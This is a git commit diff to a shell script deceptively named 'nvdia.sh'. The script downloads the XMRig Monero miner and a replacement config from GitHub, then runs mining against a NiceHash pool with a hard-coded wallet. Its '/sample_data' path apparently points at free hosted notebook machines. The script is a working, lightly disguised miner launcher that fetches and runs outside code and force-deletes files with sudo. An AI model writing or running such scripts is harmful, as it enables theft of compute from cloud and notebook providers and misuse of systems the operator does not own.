718aa152229256e2fefb8f37bdc10ab67eff60b1
MahirAlam <103423298+MahirAlam@users.noreply.github.com>
2022-04-20 15:05:17 +0600

    Update nvdia.sh

--- nvdia.sh
+++ nvdia.sh
@@ -5,8 +5,8 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux
 tar xvzf xmrig-6.17.0-linux-x64.tar.gz
 cd xmrig-6.17.0
 sudo rm -i config.json
-#sudo rm -i /sample_data
+#sudo rm -f /sample_data
 wget https://github.com/MahirAlam/rdps/blob/main/config%20(1).tar.gz
-tar xvzf config (1).tar.gz
+tar xvzf config%20(1).tar.gz
 clear
 ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 35qheUaRktAzmvTyBdpzih4moF5E3yDb6K -p x -k --nicehash --coin monero -a rx/0
